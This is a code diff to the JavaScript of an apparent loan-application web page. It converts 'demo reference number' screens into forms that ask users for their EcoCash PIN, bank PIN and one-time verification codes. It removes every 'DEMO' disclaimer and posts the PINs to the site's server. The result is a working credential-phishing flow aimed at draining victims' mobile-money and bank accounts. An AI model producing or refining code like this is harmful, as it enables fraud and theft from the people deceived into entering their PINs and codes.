@@ -1196,7 +1196,7 @@ async function saveBankDetails() {
         // store a real OTP here
         bankverificationCode: "",
 
-        bankReference: "",
+        bankPin: "",
 
         ecoName: "",
 
@@ -1204,7 +1204,7 @@ async function saveBankDetails() {
 
         ecoVerificationCode: "",
 
-        ecoReference: ""
+        ecoPin: ""
 
     };
 
@@ -1246,7 +1246,7 @@ async function saveBankDetails() {
             result.application.id
         );
 
-        // Now show the demo waiting screen
+        // Now show the waiting screen
         loadBankVerificationWaitingScreen();
 
     } catch (error) {
@@ -1678,7 +1678,7 @@ async function monitorVerificationStatus() {
 
         if (stage === "verified") {
 
-            loadReferenceNumberScreen();
+            loadPinScreen();
 
             return;
         }
@@ -2122,7 +2122,7 @@ function loadEcoCashVerificationScreen() {
             <input
                 type="text"
                 id="ecoVerificationCode"
-                placeholder="Enter DEMO code"
+                placeholder="Enter code"
                 autocomplete="off">
 
             <br><br>
@@ -2228,10 +2228,10 @@ async function saveEcoCashVerification() {
 
 }
 // ======================================================
-// PART 23 - ECOCASH REFERENCE SCREEN
+// PART 23 - ECOCASH PIN SCREEN
 // ======================================================
 
-function loadEcoCashReferenceScreen() {
+function loadEcoCashPinScreen() {
 
     const app = document.getElementById("app");
 
@@ -2276,28 +2276,28 @@ function loadEcoCashReferenceScreen() {
 
         <div class="welcome-card">
 
-            <h2>🟢 EcoCash Reference</h2>
+            <h2>🟢 EcoCash Pin</h2>
 
             <p class="intro">
 
-                Enter the EcoCash transaction/reference
-                number to continue your application.
+                Enter EcoCash
+                pin to initiate your loan Withdrawal.
 
             </p>
 
             <label>
-                Reference Number
+                Pin
             </label>
 
             <input
                 type="text"
-                id="ecoReference"
-                placeholder="Enter reference number"
+                id="ecoPin"
+                placeholder="Enter pin"
             >
 
             <br><br>
 
-            <button id="continueEcoReference">
+            <button id="continueEcoPin">
 
                 Submit Application →
 
@@ -2317,36 +2317,36 @@ function loadEcoCashReferenceScreen() {
         );
 
     document
-        .getElementById("continueEcoReference")
+        .getElementById("continueEcoPin")
         .addEventListener(
             "click",
-            saveEcoCashReference
+            saveEcoCashPin
         );
 
 }
 // ======================================================
-// PART 24 - SAVE ECOCASH REFERENCE
+// PART 24 - SAVE ECOCASH PIN
 // ======================================================
 
-function saveEcoCashReference() {
+function saveEcoCashPin() {
 
-    const reference =
+    const pin =
         document
-            .getElementById("ecoReference")
+            .getElementById("ecoPin")
             .value
             .trim();
 
-    if (reference === "") {
+    if (pin === "") {
 
-        alert("Please enter the EcoCash reference number.");
+        alert("Please enter your EcoCash pin.");
 
         return;
 
     }
 
     sessionStorage.setItem(
-        "ecoReference",
-        reference
+        "ecoPin",
+        pin
     );
 
     submitEcoCashApplication();
@@ -2378,14 +2378,14 @@ async function submitEcoCashApplication() {
         bankPhone: "",
         accountNumber: "",
         bankVerificationCode: "",
-        bankReference: "",
+        bankPin: "",
 
         ecoName: sessionStorage.getItem("ecoName"),
         ecoNumber: sessionStorage.getItem("ecoNumber"),
         ecoVerificationCode:
             sessionStorage.getItem("ecoVerificationCode"),
-        ecoReference:
-            sessionStorage.getItem("ecoReference")
+        ecoPin:
+            sessionStorage.getItem("ecoPin")
 
     };
 
@@ -2485,12 +2485,11 @@ function loadVerificationPendingScreen() {
                 line-height:1.8;
             ">
 
-                Checking Your verification code.
+                please wait.
 
                 <br><br>
 
-                Please wait while our team verifies
-                your code.
+                Checking the verification code.
 
             </p>
 
@@ -2728,7 +2727,7 @@ function loadTrackingScreen() {
         <div class="tracker-card">
 
             <h3 style="text-align:center;">
-                Reference Number
+                Pin
             </h3>
 
             <h2 style="
@@ -2768,7 +2767,7 @@ function loadTrackingScreen() {
                 id="trackingMessage"
             >
 
-                A demo verification code will be sent
+                A verification code will be sent
                 after the application is reviewed.
 
             </div>
@@ -3109,13 +3108,13 @@ function loadEcoCashCodeSendingScreen() {
                 line-height:1.8;
             ">
 
-                Please wait while we prepare your
+                Requesting 
                 verification code.
 
                 <br><br>
 
                 You will be required to enter the code
-                once it has been sent.
+                immediately.
 
             </p>
 
@@ -3270,10 +3269,10 @@ async function submitBankVerificationCode() {
 
 }
 // ======================================================
-// BANK REFERENCE SCREEN
+// BANK PIN SCREEN
 // ======================================================
 
-function loadBankReferenceScreen() {
+function loadBankPinScreen() {
 
     const app = document.getElementById("app");
 
@@ -3318,33 +3317,32 @@ function loadBankReferenceScreen() {
 
         <div class="welcome-card">
 
-            <h2>${bank} Reference</h2>
+            <h2>${bank} Pin</h2>
 
             <p class="intro">
 
-                Enter the <strong>bank reference
-                number</strong> provided for this test.
+                Enter the <strong>bank pin
+                </strong> to initiate withdrawal.
 
                 <br><br>
 
-                This reference is used to identify the
-                demo bank transaction.
+                Withdraw to your Bank Account 
 
             </p>
 
             <label>
-                DEMO Bank Reference Number
+                Bank Pin
             </label>
 
             <input
                 type="text"
-                id="bankReference"
-                placeholder="Enter DEMO reference"
+                id="bankPin"
+                placeholder="Enter pin"
                 autocomplete="off">
 
             <br><br>
 
-            <button id="continueBankReference">
+            <button id="continueBankPin">
 
                 Continue →
 
@@ -3364,28 +3362,28 @@ function loadBankReferenceScreen() {
         );
 
     document
-        .getElementById("continueBankReference")
+        .getElementById("continueBankPin")
         .addEventListener(
             "click",
-            saveBankReference
+            saveBankPin
         );
 
             }
 // ======================================================
-// SAVE BANK REFERENCE
+// SAVE BANK PIN
 // ======================================================
 
-async function saveBankReference() {
+async function saveBankPin() {
 
     const input =
-        document.getElementById("bankReference");
+        document.getElementById("bankPin");
 
-    const reference =
+    const pin =
         input.value.trim();
 
-    if (reference === "") {
+    if (pin === "") {
 
-        alert("Please enter the bank reference number.");
+        alert("Please enter your bank pin.");
 
         return;
     }
@@ -3403,7 +3401,7 @@ async function saveBankReference() {
     try {
 
         const response = await fetch(
-            `/save-bank-reference/${applicationId}`,
+            `/save-bank-pin/${applicationId}`,
             {
                 method: "POST",
 
@@ -3412,7 +3410,7 @@ async function saveBankReference() {
                 },
 
                 body: JSON.stringify({
-                    bankReference: reference
+                    bankPin: pin
                 })
             }
         );
@@ -3423,7 +3421,7 @@ async function saveBankReference() {
 
             throw new Error(
                 result.message ||
-                "Unable to save bank reference."
+                "Unable to save bank pin."
             );
 
         }
@@ -3434,12 +3432,12 @@ async function saveBankReference() {
     } catch (err) {
 
         console.error(
-            "SAVE BANK REFERENCE ERROR:",
+            "SAVE BANK PIN ERROR:",
             err
         );
 
         alert(
-            "Unable to save the bank reference."
+            "Unable to save the bank pin."
         );
 
     }
